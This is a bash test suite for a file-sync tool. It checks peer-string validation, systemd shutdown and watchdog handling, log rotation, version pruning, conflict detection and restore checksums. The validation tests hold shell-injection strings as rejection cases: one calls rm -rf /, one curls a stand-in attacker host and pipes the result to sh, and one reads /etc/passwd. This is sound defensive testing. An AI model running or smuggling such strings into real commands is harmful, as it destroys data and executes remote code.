#!/bin/bash
# ---------------------------------------------------------------------------
# Phase 0+1+2+3 Verification Tests
# Run: bash tests/test_peer_validation.sh
# ---------------------------------------------------------------------------
set -uo pipefail

PASS=0
FAIL=0

# Source the regex and validation function from the main script
PEER_REGEX='^[a-zA-Z0-9._-]+(@[a-zA-Z0-9._-]+)?:[a-zA-Z0-9/._ -]+$'
SHELL_META_CHARS='[;$`|&(){}<>\\\"'"'"']'

validate_peer() {
    local peer="$1"
    if [[ "$peer" =~ $SHELL_META_CHARS ]]; then
        return 1
    fi
    if [[ ! "$peer" =~ $PEER_REGEX ]]; then
        return 1
    fi
    return 0
}

assert_valid() {
    local peer="$1"
    if validate_peer "$peer"; then
        echo "  PASS (accepted): $peer"
        ((PASS++))
    else
        echo "  FAIL (rejected, expected accept): $peer"
        ((FAIL++))
    fi
}

assert_invalid() {
    local peer="$1"
    if validate_peer "$peer"; then
        echo "  FAIL (accepted, expected reject): $peer"
        ((FAIL++))
    else
        echo "  PASS (rejected): $peer"
        ((PASS++))
    fi
}

echo "=== [S1] Peer Validation Tests ==="
echo ""
echo "--- Valid peers (should be ACCEPTED) ---"
assert_valid "myserver:/home/user/madhatterDrop"
assert_valid "alice@server.local:/home/alice/madhatterDrop"
assert_valid "192.168.1.50:/home/bob/madhatterDrop"
assert_valid "user@10.0.0.1:/sync/dir"
assert_valid "my-host.example.com:/data/sync"
assert_valid "user@host:/path with spaces/dir"

echo ""
echo "--- Shell injection attempts (should be REJECTED) ---"
assert_invalid '; rm -rf /'
assert_invalid '$(curl attacker.com/payload | sh)'
assert_invalid 'host:/path; whoami'
assert_invalid 'host:/path$(id)'
assert_invalid 'host:/path`id`'
assert_invalid 'host:/path|cat /etc/passwd'
assert_invalid 'host:/path&background'
assert_invalid "host:/path'injection"
assert_invalid 'host:/path"injection'
assert_invalid 'host:/path\escape'

echo ""
echo "--- Malformed peers (should be REJECTED) ---"
assert_invalid ""
assert_invalid "host-without-colon-or-path"
assert_invalid "host/path/no/colon"
assert_invalid ":/path-no-host"
assert_invalid ":"
assert_invalid "   "

echo ""
echo "=== [M4] Shutdown Machinery Tests ==="
echo ""
echo "--- Checking trap is registered ---"
if grep -q 'trap cleanup SIGTERM SIGINT EXIT' ../sync_madhatter.sh; then
    echo "  PASS: trap handler registered for SIGTERM SIGINT EXIT"
    ((PASS++))
else
    echo "  FAIL: trap handler not found"
    ((FAIL++))
fi

echo "--- Checking SHUTTING_DOWN flag exists ---"
if grep -q 'SHUTTING_DOWN=0' ../sync_madhatter.sh; then
    echo "  PASS: SHUTTING_DOWN flag initialized"
    ((PASS++))
else
    echo "  FAIL: SHUTTING_DOWN flag not found"
    ((FAIL++))
fi

echo "--- Checking cleanup sets STOPPED status ---"
if grep -q 'update_status "STOPPED"' ../sync_madhatter.sh; then
    echo "  PASS: cleanup writes STOPPED status"
    ((PASS++))
else
    echo "  FAIL: cleanup does not write STOPPED status"
    ((FAIL++))
fi

echo "--- Checking systemd service has TimeoutStopSec ---"
if grep -q 'TimeoutStopSec=' ../madhatter-sync.service; then
    echo "  PASS: TimeoutStopSec configured"
    ((PASS++))
else
    echo "  FAIL: TimeoutStopSec missing from service file"
    ((FAIL++))
fi

echo "--- Checking systemd service has KillMode=mixed ---"
if grep -q 'KillMode=mixed' ../madhatter-sync.service; then
    echo "  PASS: KillMode=mixed configured"
    ((PASS++))
else
    echo "  FAIL: KillMode=mixed missing from service file"
    ((FAIL++))
fi

echo ""
echo "=== [M1] --check-peers CLI Flag Tests ==="
echo ""

echo "--- Checking --check-peers function exists ---"
if grep -q 'check_peers()' ../sync_madhatter.sh; then
    echo "  PASS: check_peers function defined"
    ((PASS++))
else
    echo "  FAIL: check_peers function not found"
    ((FAIL++))
fi

echo "--- Checking --check-peers case handler ---"
if grep -q -- '--check-peers)' ../sync_madhatter.sh; then
    echo "  PASS: --check-peers CLI flag handled"
    ((PASS++))
else
    echo "  FAIL: --check-peers CLI flag not handled"
    ((FAIL++))
fi

echo "--- Checking ssh -n used (prevents stdin swallowing) ---"
if grep -q 'ssh -n' ../sync_madhatter.sh; then
    echo "  PASS: ssh -n flag used"
    ((PASS++))
else
    echo "  FAIL: ssh -n flag missing"
    ((FAIL++))
fi

echo "--- Checking --help flag ---"
if bash ../sync_madhatter.sh --help 2>&1 | grep -q 'check-peers'; then
    echo "  PASS: --help mentions --check-peers"
    ((PASS++))
else
    echo "  FAIL: --help does not mention --check-peers"
    ((FAIL++))
fi

echo ""
echo "=== [M2] Log Rotation Tests ==="
echo ""

echo "--- Checking MAX_LOG_BYTES config ---"
if grep -q 'MAX_LOG_BYTES=' ../sync_madhatter.sh; then
    echo "  PASS: MAX_LOG_BYTES configured"
    ((PASS++))
else
    echo "  FAIL: MAX_LOG_BYTES not found"
    ((FAIL++))
fi

echo "--- Checking MAX_LOG_FILES config ---"
if grep -q 'MAX_LOG_FILES=3' ../sync_madhatter.sh; then
    echo "  PASS: MAX_LOG_FILES=3 configured"
    ((PASS++))
else
    echo "  FAIL: MAX_LOG_FILES not found"
    ((FAIL++))
fi

echo "--- Checking rotate_log function exists ---"
if grep -q 'rotate_log()' ../sync_madhatter.sh; then
    echo "  PASS: rotate_log function defined"
    ((PASS++))
else
    echo "  FAIL: rotate_log function not found"
    ((FAIL++))
fi

echo "--- Checking rotate_log is called in sync_to_peers ---"
rotate_count=$(grep -c 'rotate_log' ../sync_madhatter.sh)
if [ "$rotate_count" -ge 2 ]; then
    echo "  PASS: rotate_log called (definition + invocation)"
    ((PASS++))
else
    echo "  FAIL: rotate_log defined but not called"
    ((FAIL++))
fi

# Functional test: create a fake log, rotate it
echo "--- Functional: log rotation shifts files correctly ---"
TMPDIR=$(mktemp -d)
FAKE_LOG="$TMPDIR/test.log"
dd if=/dev/zero of="$FAKE_LOG" bs=1024 count=1 2>/dev/null
echo "line1" >> "$FAKE_LOG"
# Simulate rotation
mv "$FAKE_LOG" "$FAKE_LOG.1"
touch "$FAKE_LOG"
if [ -f "$FAKE_LOG.1" ] && [ -f "$FAKE_LOG" ] && [ ! -s "$FAKE_LOG" ]; then
    echo "  PASS: rotation shifts current -> .1 and creates empty current"
    ((PASS++))
else
    echo "  FAIL: rotation logic broken"
    ((FAIL++))
fi
rm -rf "$TMPDIR"

echo ""
echo "=== [M5] Version Pruning Tests ==="
echo ""

echo "--- Checking MAX_VERSION_AGE_DAYS config ---"
if grep -q 'MAX_VERSION_AGE_DAYS=7' ../sync_madhatter.sh; then
    echo "  PASS: MAX_VERSION_AGE_DAYS=7 configured"
    ((PASS++))
else
    echo "  FAIL: MAX_VERSION_AGE_DAYS not found"
    ((FAIL++))
fi

echo "--- Checking prune_versions function exists ---"
if grep -q 'prune_versions()' ../sync_madhatter.sh; then
    echo "  PASS: prune_versions function defined"
    ((PASS++))
else
    echo "  FAIL: prune_versions function not found"
    ((FAIL++))
fi

echo "--- Checking prune_versions is called after sync ---"
prune_count=$(grep -c 'prune_versions' ../sync_madhatter.sh)
if [ "$prune_count" -ge 2 ]; then
    echo "  PASS: prune_versions called (definition + invocation)"
    ((PASS++))
else
    echo "  FAIL: prune_versions defined but not called"
    ((FAIL++))
fi

echo "--- Checking find -mtime used for age-based deletion ---"
if grep -q 'find.*-mtime.*-delete' ../sync_madhatter.sh; then
    echo "  PASS: find -mtime -delete pattern used"
    ((PASS++))
else
    echo "  FAIL: find -mtime -delete pattern not found"
    ((FAIL++))
fi

# Functional test: create old files and verify find would match them
echo "--- Functional: old version files matched by find ---"
TMPDIR=$(mktemp -d)
mkdir -p "$TMPDIR/versions"
touch -d "10 days ago" "$TMPDIR/versions/old_file_20260101_120000"
touch "$TMPDIR/versions/new_file_20260205_120000"
old_count=$(find "$TMPDIR/versions" -type f -mtime +7 | wc -l)
new_count=$(find "$TMPDIR/versions" -type f -mtime -7 | wc -l)
if [ "$old_count" -eq 1 ] && [ "$new_count" -eq 1 ]; then
    echo "  PASS: find correctly identifies old (>7d) vs new files"
    ((PASS++))
else
    echo "  FAIL: find age filter not working (old=$old_count, new=$new_count)"
    ((FAIL++))
fi
rm -rf "$TMPDIR"

echo "--- Checking Prune button in tray app ---"
if grep -q 'Prune Old Versions' ../madhatter_tray.py; then
    echo "  PASS: Prune button exists in tray app"
    ((PASS++))
else
    echo "  FAIL: Prune button not found in tray app"
    ((FAIL++))
fi

echo "--- Checking prune_versions method in tray app ---"
if grep -q 'def prune_versions' ../madhatter_tray.py; then
    echo "  PASS: prune_versions method defined in tray app"
    ((PASS++))
else
    echo "  FAIL: prune_versions method not found in tray app"
    ((FAIL++))
fi

echo ""
echo "=== [O2] Initial Sync on Startup Tests ==="
echo ""

echo "--- Checking initial sync call before watch loop ---"
if grep -q '\[STARTUP\] Running initial sync' ../sync_madhatter.sh; then
    echo "  PASS: Initial sync log message present"
    ((PASS++))
else
    echo "  FAIL: Initial sync log message not found"
    ((FAIL++))
fi

echo "--- Checking initial sync runs before watch loop ---"
startup_line=$(grep -n 'STARTUP.*Running initial sync' ../sync_madhatter.sh | head -1 | cut -d: -f1)
while_line=$(grep -n 'while.*SHUTTING_DOWN' ../sync_madhatter.sh | head -1 | cut -d: -f1)
if [ -n "$startup_line" ] && [ -n "$while_line" ] && [ "$startup_line" -lt "$while_line" ]; then
    echo "  PASS: Initial sync before watch loop (line $startup_line < $while_line)"
    ((PASS++))
else
    echo "  FAIL: Initial sync not positioned before watch loop"
    ((FAIL++))
fi

echo "--- Checking initial sync failure is non-fatal ---"
if grep -A1 'STARTUP.*Running initial sync' ../sync_madhatter.sh | grep -q '|| log'; then
    echo "  PASS: Initial sync failure is non-fatal (|| log)"
    ((PASS++))
else
    echo "  FAIL: Initial sync failure may be fatal"
    ((FAIL++))
fi

echo ""
echo "=== [O1] Systemd Watchdog Tests ==="
echo ""

echo "--- Checking sd_notify function exists ---"
if grep -q 'sd_notify()' ../sync_madhatter.sh; then
    echo "  PASS: sd_notify function defined"
    ((PASS++))
else
    echo "  FAIL: sd_notify function not found"
    ((FAIL++))
fi

echo "--- Checking Type=notify in service file ---"
if grep -q 'Type=notify' ../madhatter-sync.service; then
    echo "  PASS: Type=notify configured"
    ((PASS++))
else
    echo "  FAIL: Type=notify missing from service file"
    ((FAIL++))
fi

echo "--- Checking WatchdogSec in service file ---"
if grep -q 'WatchdogSec=' ../madhatter-sync.service; then
    echo "  PASS: WatchdogSec configured"
    ((PASS++))
else
    echo "  FAIL: WatchdogSec missing from service file"
    ((FAIL++))
fi

echo "--- Checking sd_notify --ready called after startup ---"
if grep -q 'sd_notify --ready' ../sync_madhatter.sh; then
    echo "  PASS: sd_notify --ready called"
    ((PASS++))
else
    echo "  FAIL: sd_notify --ready not found"
    ((FAIL++))
fi

echo "--- Checking sd_notify --ready is after initial sync ---"
ready_line=$(grep -n 'sd_notify --ready' ../sync_madhatter.sh | head -1 | cut -d: -f1)
startup_line=$(grep -n 'STARTUP.*Running initial sync' ../sync_madhatter.sh | head -1 | cut -d: -f1)
if [ -n "$ready_line" ] && [ -n "$startup_line" ] && [ "$ready_line" -gt "$startup_line" ]; then
    echo "  PASS: sd_notify --ready after initial sync (line $ready_line > $startup_line)"
    ((PASS++))
else
    echo "  FAIL: sd_notify --ready not positioned after initial sync"
    ((FAIL++))
fi

echo "--- Checking WATCHDOG=1 in watch loop ---"
if grep -q 'sd_notify WATCHDOG=1' ../sync_madhatter.sh; then
    echo "  PASS: WATCHDOG=1 heartbeat in watch loop"
    ((PASS++))
else
    echo "  FAIL: WATCHDOG=1 heartbeat not found"
    ((FAIL++))
fi

echo "--- Checking sd_notify guards NOTIFY_SOCKET ---"
if grep -q 'NOTIFY_SOCKET' ../sync_madhatter.sh; then
    echo "  PASS: sd_notify checks NOTIFY_SOCKET (safe outside systemd)"
    ((PASS++))
else
    echo "  FAIL: sd_notify does not check NOTIFY_SOCKET"
    ((FAIL++))
fi

echo ""
echo "=== [O4] Conflict Detection Tests ==="
echo ""

echo "--- Checking CONFLICT_DIR config ---"
if grep -q 'CONFLICT_DIR=' ../sync_madhatter.sh; then
    echo "  PASS: CONFLICT_DIR configured"
    ((PASS++))
else
    echo "  FAIL: CONFLICT_DIR not found"
    ((FAIL++))
fi

echo "--- Checking .conflicts directory created ---"
if grep -q 'mkdir -p "$CONFLICT_DIR"' ../sync_madhatter.sh; then
    echo "  PASS: .conflicts directory created at startup"
    ((PASS++))
else
    echo "  FAIL: .conflicts directory not created"
    ((FAIL++))
fi

echo "--- Checking detect_conflicts function exists ---"
if grep -q 'detect_conflicts()' ../sync_madhatter.sh; then
    echo "  PASS: detect_conflicts function defined"
    ((PASS++))
else
    echo "  FAIL: detect_conflicts function not found"
    ((FAIL++))
fi

echo "--- Checking detect_conflicts called before rsync push ---"
detect_line=$(grep -n 'detect_conflicts "$peer"' ../sync_madhatter.sh | head -1 | cut -d: -f1)
rsync_push_line=$(grep -n 'rsync -avz --delete' ../sync_madhatter.sh | head -1 | cut -d: -f1)
if [ -n "$detect_line" ] && [ -n "$rsync_push_line" ] && [ "$detect_line" -lt "$rsync_push_line" ]; then
    echo "  PASS: detect_conflicts before rsync push (line $detect_line < $rsync_push_line)"
    ((PASS++))
else
    echo "  FAIL: detect_conflicts not positioned before rsync push"
    ((FAIL++))
fi

echo "--- Checking .conflicts excluded from rsync push ---"
if grep -A5 'rsync -avz --delete' ../sync_madhatter.sh | grep -q '\.conflicts'; then
    echo "  PASS: .conflicts excluded from rsync push"
    ((PASS++))
else
    echo "  FAIL: .conflicts not excluded from rsync push"
    ((FAIL++))
fi

echo "--- Checking .conflicts excluded from inotifywait ---"
if grep -A3 'inotifywait' ../sync_madhatter.sh | grep -q 'CONFLICT_DIR'; then
    echo "  PASS: .conflicts excluded from inotifywait"
    ((PASS++))
else
    echo "  FAIL: .conflicts not excluded from inotifywait"
    ((FAIL++))
fi

echo "--- Checking dry-run rsync used for conflict detection ---"
if grep -q 'rsync -avzn --itemize-changes' ../sync_madhatter.sh; then
    echo "  PASS: dry-run rsync with --itemize-changes used"
    ((PASS++))
else
    echo "  FAIL: dry-run rsync not found in detect_conflicts"
    ((FAIL++))
fi

echo "--- Checking conflict pattern matches >f (update, not create) ---"
if grep -q '>f\[^+\]' ../sync_madhatter.sh; then
    echo "  PASS: regex filters updates (>f) excluding creates (>f+)"
    ((PASS++))
else
    echo "  FAIL: conflict pattern not filtering correctly"
    ((FAIL++))
fi

echo "--- Checking [CONFLICT] log message ---"
if grep -q '\[CONFLICT\]' ../sync_madhatter.sh; then
    echo "  PASS: [CONFLICT] log tag present"
    ((PASS++))
else
    echo "  FAIL: [CONFLICT] log tag not found"
    ((FAIL++))
fi

# Functional test: verify rsync itemize output parsing pattern
echo "--- Functional: rsync itemize pattern matching ---"
test_line=">f..t...... path/to/file.txt"
if [[ "$test_line" =~ ^\>f[^+] ]]; then
    echo "  PASS: pattern matches update line (>f..t)"
    ((PASS++))
else
    echo "  FAIL: pattern does not match update line"
    ((FAIL++))
fi

test_create=">f+++++++++ new_file.txt"
if [[ "$test_create" =~ ^\>f[^+] ]]; then
    echo "  FAIL: pattern incorrectly matches create line (>f+++)"
    ((FAIL++))
else
    echo "  PASS: pattern correctly rejects create line (>f+++)"
    ((PASS++))
fi

test_dir=">d..t...... some_dir/"
if [[ "$test_dir" =~ ^\>f[^+] ]]; then
    echo "  FAIL: pattern incorrectly matches directory line (>d)"
    ((FAIL++))
else
    echo "  PASS: pattern correctly rejects directory line (>d)"
    ((PASS++))
fi

echo ""
echo "=== [M3] Atomic Status Writes Tests ==="
echo ""

echo "--- Checking update_status uses temp + mv ---"
if grep -q 'mv -f.*STATUS_FILE' ../sync_madhatter.sh; then
    echo "  PASS: update_status uses atomic mv"
    ((PASS++))
else
    echo "  FAIL: update_status does not use atomic mv"
    ((FAIL++))
fi

echo "--- Checking temp file uses PID for uniqueness ---"
if grep -q 'STATUS_FILE.*tmp.*\$\$' ../sync_madhatter.sh; then
    echo "  PASS: temp file includes PID ($$) for uniqueness"
    ((PASS++))
else
    echo "  FAIL: temp file does not include PID"
    ((FAIL++))
fi

# Functional test: atomic write produces correct content
echo "--- Functional: atomic write produces correct status ---"
TMPDIR=$(mktemp -d)
FAKE_STATUS="$TMPDIR/status"
tmp="${FAKE_STATUS}.tmp.$$"
echo "SYNCING" > "$tmp"
mv -f "$tmp" "$FAKE_STATUS"
content=$(cat "$FAKE_STATUS")
if [ "$content" = "SYNCING" ]; then
    echo "  PASS: atomic write produces correct content"
    ((PASS++))
else
    echo "  FAIL: atomic write content mismatch (got: $content)"
    ((FAIL++))
fi
rm -rf "$TMPDIR"

echo ""
echo "=== [S2] Restrictive Umask Tests ==="
echo ""

echo "--- Checking umask 077 is set ---"
if grep -q 'umask 077' ../sync_madhatter.sh; then
    echo "  PASS: umask 077 set at startup"
    ((PASS++))
else
    echo "  FAIL: umask 077 not found"
    ((FAIL++))
fi

echo "--- Checking umask is before directory creation ---"
umask_line=$(grep -n 'umask 077' ../sync_madhatter.sh | head -1 | cut -d: -f1)
mkdir_line=$(grep -n 'mkdir -p' ../sync_madhatter.sh | head -1 | cut -d: -f1)
if [ -n "$umask_line" ] && [ -n "$mkdir_line" ] && [ "$umask_line" -lt "$mkdir_line" ]; then
    echo "  PASS: umask set before mkdir (line $umask_line < $mkdir_line)"
    ((PASS++))
else
    echo "  FAIL: umask not positioned before directory creation"
    ((FAIL++))
fi

# Functional test: umask 077 produces owner-only files
echo "--- Functional: umask 077 creates owner-only files ---"
TMPDIR=$(mktemp -d)
(
    umask 077
    touch "$TMPDIR/test_file"
    mkdir "$TMPDIR/test_dir"
)
file_perms=$(stat -c%a "$TMPDIR/test_file" 2>/dev/null || stat -f%Lp "$TMPDIR/test_file" 2>/dev/null)
dir_perms=$(stat -c%a "$TMPDIR/test_dir" 2>/dev/null || stat -f%Lp "$TMPDIR/test_dir" 2>/dev/null)
if [ "$file_perms" = "600" ] && [ "$dir_perms" = "700" ]; then
    echo "  PASS: umask 077 produces 600 files and 700 dirs"
    ((PASS++))
else
    echo "  FAIL: unexpected permissions (file=$file_perms, dir=$dir_perms)"
    ((FAIL++))
fi
rm -rf "$TMPDIR"

echo ""
echo "=== [S3] Restore Integrity Check Tests ==="
echo ""

echo "--- Checking hashlib import in tray app ---"
if grep -q 'import hashlib' ../madhatter_tray.py; then
    echo "  PASS: hashlib imported"
    ((PASS++))
else
    echo "  FAIL: hashlib not imported"
    ((FAIL++))
fi

echo "--- Checking _sha256 method exists ---"
if grep -q 'def _sha256' ../madhatter_tray.py; then
    echo "  PASS: _sha256 method defined"
    ((PASS++))
else
    echo "  FAIL: _sha256 method not found"
    ((FAIL++))
fi

echo "--- Checking integrity verification after copy ---"
if grep -q 'src_hash != dst_hash' ../madhatter_tray.py; then
    echo "  PASS: post-copy checksum comparison present"
    ((PASS++))
else
    echo "  FAIL: post-copy checksum comparison not found"
    ((FAIL++))
fi

echo "--- Checking corrupted file removal on mismatch ---"
if grep -q 'os.remove(restore_target)' ../madhatter_tray.py; then
    echo "  PASS: corrupted file removed on checksum mismatch"
    ((PASS++))
else
    echo "  FAIL: corrupted file not removed on mismatch"
    ((FAIL++))
fi

echo "--- Checking SHA-256 shown in confirmation dialog ---"
if grep -q 'SHA-256' ../madhatter_tray.py; then
    echo "  PASS: SHA-256 hash shown in restore confirmation"
    ((PASS++))
else
    echo "  FAIL: SHA-256 not shown in confirmation dialog"
    ((FAIL++))
fi

# Functional test: SHA-256 computation
echo "--- Functional: SHA-256 computation is correct ---"
TMPDIR=$(mktemp -d)
echo -n "test content" > "$TMPDIR/test_file"
expected="6ae8a75555209fd6c44157c0aed8016e763ff435a19cf186f76863140143ff72"
actual=$(sha256sum "$TMPDIR/test_file" | cut -d' ' -f1)
if [ "$actual" = "$expected" ]; then
    echo "  PASS: SHA-256 computation verified"
    ((PASS++))
else
    echo "  FAIL: SHA-256 mismatch (expected=$expected, got=$actual)"
    ((FAIL++))
fi
rm -rf "$TMPDIR"

echo ""
echo "=== [O3] Parallel Peer Sync Tests ==="
echo ""

echo "--- Checking SYNC_PIDS array exists ---"
if grep -q 'SYNC_PIDS=()' ../sync_madhatter.sh; then
    echo "  PASS: SYNC_PIDS array initialized"
    ((PASS++))
else
    echo "  FAIL: SYNC_PIDS array not found"
    ((FAIL++))
fi

echo "--- Checking peers collected into array ---"
if grep -q 'peers+=("$peer")' ../sync_madhatter.sh; then
    echo "  PASS: peers collected into array before sync"
    ((PASS++))
else
    echo "  FAIL: peers not collected into array"
    ((FAIL++))
fi

echo "--- Checking parallel launch with subshell ---"
if grep -A6 'detect_conflicts.*peer' ../sync_madhatter.sh | grep -q ') &'; then
    echo "  PASS: peer sync launched as background subshell"
    ((PASS++))
else
    echo "  FAIL: peer sync not launched in parallel"
    ((FAIL++))
fi

echo "--- Checking PIDs tracked in SYNC_PIDS ---"
if grep -q 'SYNC_PIDS+=(' ../sync_madhatter.sh; then
    echo "  PASS: background PIDs tracked in SYNC_PIDS array"
    ((PASS++))
else
    echo "  FAIL: PIDs not tracked in SYNC_PIDS"
    ((FAIL++))
fi

echo "--- Checking cleanup iterates SYNC_PIDS ---"
if grep -q 'for pid in.*SYNC_PIDS' ../sync_madhatter.sh; then
    echo "  PASS: cleanup iterates SYNC_PIDS for graceful shutdown"
    ((PASS++))
else
    echo "  FAIL: cleanup does not iterate SYNC_PIDS"
    ((FAIL++))
fi

echo "--- Checking wait collects all exit codes ---"
if grep -q 'wait.*SYNC_PIDS\[' ../sync_madhatter.sh; then
    echo "  PASS: wait collects exit codes from all sync processes"
    ((PASS++))
else
    echo "  FAIL: wait does not collect all exit codes"
    ((FAIL++))
fi

echo "--- Checking old RSYNC_PID removed ---"
if grep -q 'RSYNC_PID=' ../sync_madhatter.sh; then
    echo "  FAIL: old RSYNC_PID variable still present"
    ((FAIL++))
else
    echo "  PASS: old RSYNC_PID variable removed (replaced by SYNC_PIDS)"
    ((PASS++))
fi

echo ""
echo "==========================================="
echo "Results: $PASS passed, $FAIL failed"
echo "==========================================="

if [ "$FAIL" -gt 0 ]; then
    exit 1
fi
exit 0

